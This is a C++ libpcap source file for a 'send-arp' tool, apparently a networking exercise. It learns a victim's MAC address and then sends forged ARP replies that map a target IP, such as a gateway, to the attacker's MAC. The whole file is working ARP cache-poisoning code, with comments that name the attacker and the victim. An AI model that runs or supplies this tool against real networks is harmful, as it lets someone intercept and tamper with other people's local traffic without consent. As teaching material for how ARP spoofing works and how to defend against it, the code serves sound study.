#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include "mac.h"
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

EthArpPacket request_packet(Ip attacker_ipaddr, Ip sender_ipaddr, Mac attacker_macaddr) { //used for finding out sender's mac address
	EthArpPacket packet;
	packet.eth_.smac_ = Mac(attacker_macaddr);
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(attacker_macaddr);
	packet.arp_.sip_ = htonl(Ip(attacker_ipaddr));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(sender_ipaddr);
	return packet;
}

EthArpPacket reply_packet(Ip target_ipaddr, Ip sender_ipaddr, Mac sender_macaddr, Mac attacker_macaddr) { //used for sending the packet to victim
	EthArpPacket packet;
	packet.eth_.dmac_ = sender_macaddr;
	packet.eth_.smac_ = attacker_macaddr;
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = attacker_macaddr;
	packet.arp_.sip_ = htonl(target_ipaddr);
	packet.arp_.tmac_ = sender_macaddr;
	packet.arp_.tip_ = htonl(sender_ipaddr);
	return packet;
}

int attacker_info(char* dev, uint32_t* ip, uint8_t* mac) { //finds out attacker(me)'s ip & mac address
	struct ifreq ifr;
	uint8_t ip_arr[Ip::SIZE];
	int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	int ret_ip = ioctl(sockfd, SIOCGIFADDR, &ifr);
	int ret_mac = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
	if (sockfd < 0 || ret_ip < 0 || ret_mac < 0) {
		close(sockfd);
		return -1;
	}
	memcpy(ip_arr, ifr.ifr_addr.sa_data + 2, Ip::SIZE);
	*ip = (ip_arr[0]<<24)|(ip_arr[1]<<16)|(ip_arr[2]<<8)|(ip_arr[3]);
	memcpy(mac, ifr.ifr_hwaddr.sa_data, Mac::SIZE);
	close(sockfd);
	return 0;
}

int get_sender_mac(char* dev, Ip sender_ipaddr, Mac attacker_macaddr, Ip attacker_ipaddr, uint8_t* mac) { //finds out sender(victim)'s mac address
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	struct pcap_pkthdr* header;
	const u_char* packet;
	EthArpPacket req_packet = request_packet(attacker_ipaddr, sender_ipaddr, attacker_macaddr);
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&req_packet), sizeof(EthArpPacket));
	if(res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return -1;
	}

	while(true) {
		res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res < 0) {
			fprintf(stderr, "pcap_next_ex return %d error=%s\n", res, pcap_geterr(handle));
			return -1;
		}
		EthArpPacket* receive_packet = (EthArpPacket*) packet;
		memcpy(mac, &receive_packet->arp_.smac_, Mac::SIZE);
		break;
	}
	return 0;
}

int send_arp(char* dev, pcap_t* handle, Ip sender_ipaddr, Ip target_ipaddr) { //sends ARP reply for attack
	uint32_t ip;
	uint8_t attacker_mac_arr[Mac::SIZE];
	if (attacker_info(dev, &ip, attacker_mac_arr) < 0) return -1;
	Ip attacker_ipaddr = Ip(ip);
	Mac attacker_macaddr = Mac(attacker_mac_arr);

	uint8_t sender_mac_arr[Mac::SIZE];
	if(get_sender_mac(dev, sender_ipaddr, attacker_macaddr, attacker_ipaddr, sender_mac_arr) < 0) return -1;
	Mac sender_macaddr = Mac(sender_mac_arr);

	EthArpPacket packet = reply_packet(target_ipaddr, sender_ipaddr, sender_macaddr, attacker_macaddr);
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if(res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return -1;
	}
	return 0;
}


int main(int argc, char* argv[]) {
	if (argc < 4 || argc & 1) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	for(int i=0; i<((argc-2)/2); i++) {
		printf("------------send-arp #%d------------\n", i+1);
		Ip sender_ipaddr = Ip(argv[2*i+2]);
		Ip target_ipaddr = Ip(argv[2*i+3]);
		if(send_arp(dev, handle, sender_ipaddr, target_ipaddr) != 0) {
			printf("send-arp #%d failed\n");
			break;
		}
		else printf("send-arp #%d success\n", i+1);
	}
	pcap_close(handle);
	return 0;
}
